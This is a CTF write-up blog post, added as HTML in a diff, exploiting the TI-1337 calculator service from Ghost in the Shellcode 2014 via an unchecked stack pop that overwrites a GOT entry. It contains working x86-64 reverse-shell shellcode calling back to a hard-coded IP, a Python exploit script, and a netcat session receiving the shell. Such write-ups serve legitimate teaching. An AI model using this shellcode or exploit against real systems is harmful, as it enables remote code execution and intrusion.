@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Ghost in the Shellcode: TI-1337 Pwnable</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In this level we were presented with an ELF 64bits executable, a good oportunity to exercise linux exploiting on 64bits systems and try Hopper for the first time :)
+When you run the binary, it begins listening in port 31415 (pi!) but if we try to connect, it complains about a missing user &amp;ldquo;gambino&amp;rdquo;. So we have to create the user. Once created, if we try to connect to the service we get nothing.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Ghost in the Shellcode: TI-1337 Pwnable">
+    <meta name="twitter:description" content="In this level we were presented with an ELF 64bits executable, a good oportunity to exercise linux exploiting on 64bits systems and try Hopper for the first time :)
+When you run the binary, it begins listening in port 31415 (pi!) but if we try to connect, it complains about a missing user &amp;ldquo;gambino&amp;rdquo;. So we have to create the user. Once created, if we try to connect to the service we get nothing.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Ghost in the Shellcode: TI-1337 Pwnable">
+  <meta property="og:description" content="In this level we were presented with an ELF 64bits executable, a good oportunity to exercise linux exploiting on 64bits systems and try Hopper for the first time :)
+When you run the binary, it begins listening in port 31415 (pi!) but if we try to connect, it complains about a missing user &amp;ldquo;gambino&amp;rdquo;. So we have to create the user. Once created, if we try to connect to the service we get nothing.">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/03/15/ghost-in-the-shellcode-ti-1337-pwnable/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/03/15/ghost-in-the-shellcode-ti-1337-pwnable/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Ghost in the Shellcode: TI-1337 Pwnable</h1>
+      <p class="post-meta">@pwntester · Mar 15, 2014 · 7 min read</p>
+    </header>
+    <article class="post-content"><p>In this level we were presented with an ELF 64bits executable, a good oportunity to exercise linux exploiting on 64bits systems and try Hopper for the first time :)</p>
+
+<p>When you run the binary, it begins listening in port 31415 (pi!) but if we try to connect, it complains about a missing user &ldquo;gambino&rdquo;. So we have to create the user. Once created, if we try to connect to the service we get nothing. We can send arbitrary data and if we send strings we get a &ldquo;Unknown op &lsquo;your string here&rsquo;&rdquo; error, so it seems like its waiting for commands. Sending numbers dont return any errors.</p>
+
+<p>Since its a network service, we can assume its using fork to spawn new process to attend the incoming requests. We will be using Hopper to dissasamble and revere the binary. So first thing to do is find if there is a fork and of so replace it with a NOP instruction that also sets RAX to 0 so the program can continue as if it was the child process.</p>
+
+<p>fork() call can be found at 0x0000000000400f65 (E8 06 FD FF FF) and if you dont want to be setting gdb to follow child processes, you can use an hex editor to replace it with xor eax,eax; nop; nop; nop (31 c0 90 90 90) as suggested in this <a href="https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100">post</a></p>
+
+<p>If the fork goes ok, the child runs this code that uses &ldquo;call rax&rdquo; to jump to the main routine. I used gdb to find out the value of rax at that point that turns out to be 0x401567</p>
+
+<p><img src="/images/octopress/gits100-1.png" alt="" /></p>
+
+<p>The first thing it does here is calling a function (sub_401395) that we will rename to receive_command since thats exactly what it does. When it receives data, it stores it in a buffer of 256 bytes that we cannot overflow. When it receives a line terminator (0x0a), it scans the value using sscanf and &ldquo;%lg&rdquo; as the format string which stands for a double (number with up to six digits of precision). If the scan is successful the value is stored in an structure along with a 0x1 to indicate its a double value. Any other non numeric value is stored in the same structure but using 0x2 to indicate it was not a number.</p>
+
+<p>Back in the main routine, it checks the structure returned and if it was numeric it calls a function (sub_40149f) that copies the value in a memory area that behaves like a stack, growing to higher memory values. This stack stores the total number of items stored in the first qword followed by a null qword and then the stored items:</p>
+
+<pre><code class="language-lang-bash">gdb-peda$ x/64x $rdx
+0x603140:   0x0000000000000001  0x0000000000000000   &lt;- Beggining of the stack (# items - 0x0)
+0x603150:   0x3ff0000000000000  0x0000000000000000   &lt;- (1st item - not used yet)
+0x603160:   0x0000000000000000  0x0000000000000000   &lt;- (not used yet - not used yet)
+</code></pre>
+
+<p>If the command sent was not numeric, it uses a jump table (switch) to process the operand. If the command received is bigger than 0x71 = ‘q’ it quits with a &ldquo;non valid op&rdquo; error. If its between 0x0 and 0x50 it uses the jump table that after an initial analysis seems to be waiting for the following commands: +,-,*,/,^,!,b,c,.</p>
+
+<p>This looks like a calculator so we try to send some operations and find out what these commands are used for. It turns out to be a reverse notation calculator where you first enter the values and then the operand. This is the meaning of the following operands:</p>
+
+<ul>
+<li>+: Adds the two values on the top of the stack</li>
+<li>-: Same but substracts</li>
+<li>*: Multiply</li>
+<li>/: Division</li>
+<li>!: ¿?¿?</li>
+<li>^: power</li>
+<li>b: pops a value from the stack and prints the value</li>
+<li>c: clear the stack, moves the stack pointer to the beggining of the stack and initialize the counter but does not erase stored values.</li>
+<li>.: prints the value on the top of the stack</li>
+</ul>
+
+<p><img src="/images/octopress/gits100-2.png" alt="" /></p>
+
+<p>Note that Hopper cannot reverse the jump table correctly.</p>
+
+<p>Ok, so the vulnerability here is that &ldquo;b&rdquo; pop items from the calculator stack but does not check if it reaches the bottom. So we can pop as many values as we want and then send doubles that will be stored in any memory location before the calculator stack. And what do we have there??</p>
+
+<pre><code class="language-lang-bash">gdb-peda$ x/64x $rdx - 256
+0x603040 &lt;strlen@got.plt&gt;:  0x0000000000400b16  0x00007ffff78a0250
+0x603050 &lt;htons@got.plt&gt;:   0x00007ffff78c1b90  0x0000000000400b46
+0x603060 &lt;htonl@got.plt&gt;:   0x00007ffff78c1b80  0x00007ffff78546d0
+0x603070 &lt;pow@got.plt&gt;: 0x0000000000400b76  0x0000000000400b86
+0x603080 &lt;close@got.plt&gt;:   0x00007ffff789fa20  0x00007ffff7879df0
+0x603090 &lt;__libc_start_main@got.plt&gt;:   0x00007ffff77efdb0  0x00007ffff7803380
+0x6030a0 &lt;getpwnam@got.plt&gt;:    0x00007ffff787b670  0x0000000000400be6
+0x6030b0 &lt;err@got.plt&gt;: 0x0000000000400bf6  0x00007ffff7828fd0
+0x6030c0 &lt;listen@got.plt&gt;:  0x00007ffff78ac820  0x00007ffff78ac700
+0x6030d0 &lt;setgid@got.plt&gt;:  0x00007ffff787db90  0x00007ffff78ac6a0
+0x6030e0 &lt;exit@got.plt&gt;:    0x0000000000400c56  0x00007ffff787db30
+0x6030f0 &lt;fork@got.plt&gt;:    0x0000000000400c76  0x00007ffff78acbb0
+0x603100:   0x0000000000000000  0x0000000000000000
+0x603110:   0x0000000000007ab7  0x0000000000401a10
+0x603120:   0x0000000000000000  0x0000000000000000
+0x603130:   0x0000000000000000  0x0000000000000000
+0x603140:   0x0000000000000001  0x0000000000000000   &lt;- Beggining of the stack (# items - 0x0)
+0x603150:   0x3ff0000000000000  0x0000000000000000   &lt;- (1st item - not used yet)
+0x603160:   0x0000000000000000  0x0000000000000000   &lt;- (not used yet - not used yet)
+</code></pre>
+
+<p>The GOT!!!! So we can overwrite any entry in the GOT so that when that function gets called, the program flow will jump to the address we can set there. So we can store our shellcode in the calculator stack and then clear it (not erasing the shellcode) and then pop 38 items so that next value we send will effectively overwrite the GOT entry for recv() with the address of the begining of our shellcode. Next call to recv() will be replaced with a call to our shellcode. Only problem here is that we need to send doubles and account for how they are going to be stored in memory. I couldnt get it working in python (struct.unpack(&ldquo;d&rdquo;, value)) since the precision was not accurate and I couldnt control the values to be written in the stack, so I borrowed the converter used in this <a href="https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100">post</a> &hellip;. yep, I cheated, damn python!</p>
+
+<p>Using that converter:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, const char *argv[]) {
+
+        /* The address and port for the shellcode */
+        #define SCPORT &quot;\x41\x41&quot; /* 16705 */
+        #define SCIPADDR &quot;\xc0\xa8\xef\x90&quot; /* 192.168.239.144 */
+
+        /* The shellcode */
+        char shellcode[] =
+          &quot;\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a&quot;
+          &quot;\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0&quot;
+          &quot;\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24&quot;
+          &quot;\x02&quot;SCPORT&quot;\xc7\x44\x24\x04&quot;SCIPADDR&quot;\x48\x89\xe6\x6a\x10&quot;
+          &quot;\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48&quot;
+          &quot;\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a&quot;
+          &quot;\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54&quot;
+          &quot;\x5f\x6a\x3b\x58\x0f\x05&quot;
+          /* End with a bunch of NOPs to make sure it's a multiple of 8 */
+          &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;;
+
+
+        int i;
+        for(i = 0; i &lt; strlen(shellcode); i += 8) {
+          char buf[1024];
+          double d;
+
+          /* Convert the value to a double */
+          memcpy(&amp;d, shellcode + i, 8);
+
+          /* Turn the double into a string */
+          sprintf(buf, &quot;%.127lg\n&quot;, d);
+          printf(&quot;%s&quot;, buf);
+        }
+        exit(0);
+}
+</code></pre>
+
+<p>This program will generate the doubles we need to send in order to place our shellcode that will look like this:</p>
+
+<pre><code class="language-lang-clike">gdb-peda$ x/64x $rdx
+0x603140:   0x0000000000000010  0x0000000000000000
+0x603150:   0x3148ff3148c03148  0x6ac0314dd23148f6  &lt;--- shellcode
+0x603160:   0x5a066a5e016a5f02  0xc08949050f58296a
+0x603170:   0x5241d2314df63148  0x2444c766022404c6
+0x603180:   0xc0042444c7414102  0x106ae6894890efa8
+0x603190:   0x0f582a6a5f50415a  0x485e036af6314805
+0x6031a0:   0x75050f58216aceff  0x5a5e5757ff3148f6
+0x6031b0:   0x2f6e69622f2fbf48  0x545708efc1486873
+0x6031c0:   0x9090050f583b6a5f  0x0000909090909090  &lt;---- ending nops
+0x6031d0:   0x0000000000000000  0x0000000000000000
+</code></pre>
+
+<p>and my exploit:</p>
+
+<pre><code class="language-lang-python">import socket
+import struct
+import subprocess
+import time
+
+host = &quot;localhost&quot;
+port = 31415
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+
+cmd=&quot;/home/pwntester/Desktop/gits-2014/ti-1337/convert&quot;
+result = subprocess.check_output(cmd, shell=True)
+lines = result.split(&quot;\n&quot;)
+print &quot;[+] Sending shellcode&quot;
+for line in lines:
+        if line != &quot;&quot;:
+                print &quot;[+] Sending: &quot; + line
+                s.send(line + '\n')
+
+print &quot;[+] Clearing Stack&quot;
+s.send('c\n')
+print &quot;[+] Popping my way to recv@got&quot;
+for i in xrange(38):
+        s.send('b\n')
+print &quot;[+] Replacing recv@got with shellcode address&quot;
+s.send('2261634.5098039214499294757843017578125\n')  # 0x4141414141414141
+time.sleep(1)
+s.close()
+</code></pre>
+
+<p>Executing this exploit will place 41414141414141 in the GOT entry for recv() so we should get a crash:</p>
+
+<pre><code class="language-lang-bash">gdb-peda$
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x8
+RBX: 0x0
+RCX: 0x0
+RDX: 0x1
+RSI: 0x7fffffffe29f --&gt; 0x10a
+RDI: 0x8
+RBP: 0x7fffffffe2b0 --&gt; 0x7fffffffe3f0 --&gt; 0x7fffffffe530 --&gt; 0x7fffffffe560 --&gt; 0x7fffffffe590 --&gt; 0x0
+RSP: 0x7fffffffe268 --&gt; 0x401357 (mov    QWORD PTR [rbp-0x10],rax)
+RIP: 0x400ad0 (&lt;recv@plt&gt;:  jmp    QWORD PTR [rip+0x20254a]        # 0x603020 &lt;recv@got.plt&gt;)
+R8 : 0x0
+R9 : 0x600000 ('')
+R10: 0x0
+R11: 0x7ffff7854b0d (ret)
+R12: 0x400c90 (xor    ebp,ebp)
+R13: 0x7fffffffe670 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x10287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+0x0000000000400ad0 in recv@plt ()
+gdb-peda$ x/1x 0x000603020
+0x603020 &lt;recv@got.plt&gt;:    0x4141414141414141
+</code></pre>
+
+<p>Nice, we can now overwrite the GOT entry with our shellcode address (0x0000000000603150) using this double: 3.114629356634885514212623795744696989099126200464912460920046189338858451871977588458999392410662226841627927565265440233180118e-317</p>
+
+<pre><code class="language-lang-bash">gdb-peda$ x/x 0x603020
+0x603020 &lt;recv@got.plt&gt;:    0x0000000000603150
+</code></pre>
+
+<p>We successfully owerwrite the GOT entry with the shellcode address and we get our shell back:</p>
+
+<pre><code class="language-lang-bash">root@dragonstone:~# nc -lvp 16705
+nc: listening on :: 16705 ...
+nc: listening on 0.0.0.0 16705 ...
+nc: connect to 192.168.239.144 16705 from 192.168.239.144 (192.168.239.144) 50403 [50403]
+pwd
+/home/gambino
+id
+uid=1001(gambino) gid=1000(gambino) groups=1000(gambino)
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/pwnable"><span class="tag">Pwnable</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2049</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
